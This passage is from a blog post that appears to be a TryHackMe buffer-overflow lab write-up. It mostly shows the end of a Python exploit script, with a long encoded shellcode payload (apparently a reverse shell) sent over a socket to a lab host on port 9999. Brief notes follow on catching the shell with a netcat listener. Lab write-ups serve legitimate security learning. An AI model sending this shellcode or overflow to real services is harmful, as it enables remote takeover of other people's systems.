<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\xda\xd0\xd9\x74\x24\xf4\x5d\x2b\xc9\xb8\x18\xb9\xbe\x48\xb1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x31\x45\x17\x83\xed\xfc\x03\x5d\xaa\x5c\xbd\xa1\x24\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3e\x59\xb5\x43\xb6\xbc\x84\x43\xac\xb5\xb7\x73\xa6\x9b\x3b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xea\x0f\xcf\x8d\x22\x20\x78\x3b\x15\x0f\x79\x10\x65\x0e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xf9\x6b\xba\xf0\xc0\xa3\xcf\xf1\x05\xd9\x22\xa3\xde\x95\x91</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x53\x6a\xe3\x29\xd8\x20\xe5\x29\x3d\xf0\x04\x1b\x90\x8a\x5e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xbb\x13\x5e\xeb\xf2\x0b\x83\xd6\x4d\xa0\x77\xac\x4f\x60\x46</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4d\xe3\x4d\x66\xbc\xfd\x8a\x41\x5f\x88\xe2\xb1\xe2\x8b\x31</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xcb\x38\x19\xa1\x6b\xca\xb9\x0d\x8d\x1f\x5f\xc6\x81\xd4\x2b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x80\x85\xeb\xf8\xbb\xb2\x60\xff\x6b\x33\x32\x24\xaf\x1f\xe0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x45\xf6\xc5\x47\x79\xe8\xa5\x38\xdf\x63\x4b\x2c\x52\x2e\x04</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x81\x5f\xd0\xd4\x8d\xe8\xa3\xe6\x12\x43\x2b\x4b\xda\x4d\xac</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xac\xf1\x2a\x22\x53\xfa\x4a\x6b\x90\xae\x1a\x03\x31\xcf\xf0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd3\xbe\x1a\x56\x83\x10\xf5\x17\x73\xd1\xa5\xff\x99\xde\x9a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe0\xa2\x34\xb3\x8b\x59\xdf\xb6\x4b\x63\x10\xaf\x49\x63\x3f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\xc7\x85\x55\x9b\x81\x1e\xc2\x02\x88\xd4\x73\xca\x06\x91</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xb4\x40\xa5\x66\x7a\xa1\xc0\x74\xeb\x41\x9f\x26\xba\x5e\x35</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4e\x20\xcc\xd2\x8e\x2f\xed\x4c\xd9\x78\xc3\x84\x8f\x94\x7a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3f\xad\x64\x1a\x78\x75\xb3\xdf\x87\x74\x36\x5b\xac\x66\x8e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x64\xe8\xd2\x5e\x33\xa6\x8c\x18\xed\x08\x66\xf3\x42\xc3\xee</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x82\xa8\xd4\x68\x8b\xe4\xa2\x94\x3a\x51\xf3\xab\xf3\x35\xf3</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd4\xe9\xa5\xfc\x0f\xaa\xc6\x1e\x85\xc7\x6e\x87\x4c\x6a\xf3</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x38\xbb\xa9\x0a\xbb\x49\x52\xe9\xa3\x38\x57\xb5\x63\xd1\x25</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa6\x01\xd5\x9a\xc7\x03</span><span class="s">"</span><span class="p">)</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'10.0.2.4'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span><span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[!] Cannot connect to the service."</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Next to send the exploit, we gaing access in our WinVM machine:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221101192658.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Gaining Access</strong></p>

<p>Thus, we set up a netcat listener on the port 4444 and then launch the exploit.py and:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221101193558.png" text-align="center" />
</div>

<p><br /></p>


      </article>

      
        <div class="blog-tags">
          <span>Tags:</span>
          
            <a href="/tags#thm">thm</a>
          
        </div>
      

      

      
        <!-- Check if any share-links are active -->




<section id = "social-share-section">
  <span class="sr-only">Share: </span>

  
    <a href="https://twitter.com/intent/tweet?text=7.BufferOverflow.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-02-7.BufferOverflow%2F"
      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
      <span class="sr-only">Twitter</span>
    </a>
  

  
    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-11-02-7.BufferOverflow%2F"
      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
      <span class="sr-only">Facebook</span>
    </a>
  

  
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-02-7.BufferOverflow%2F"
      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
      <span class="sr-only">LinkedIn</span>
    </a>
  

  

  

</section>



      

      <ul class="pagination blog-pager">
        
        <li class="page-item previous">
          <a class="page-link" href="/2022-11-01-6.OffensivePentesting/" data-toggle="tooltip" data-placement="top" title="6.Offensive Pentesting">&larr; Previous Post</a>
        </li>
        
        
        <li class="page-item next">
          <a class="page-link" href="/2022-11-09-Tier_0/" data-toggle="tooltip" data-placement="top" title="Tier 0">Next Post &rarr;</a>
        </li>
        
      </ul>
      
  
  
  

  


  



    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="/feed.xml" title="RSS">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">RSS</span>
    </a>
  </li><li class="list-inline-item">
    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Email me</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://github.com/Qv1nTv5" title="GitHub">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">GitHub</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://twitter.com/Qvintvs1" title="Twitter">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Twitter</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">LinkedIn</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        Qv1nTv5
        &nbsp;&bull;&nbsp;
      
      2024

      

      
      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>
</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









</body>
</html>
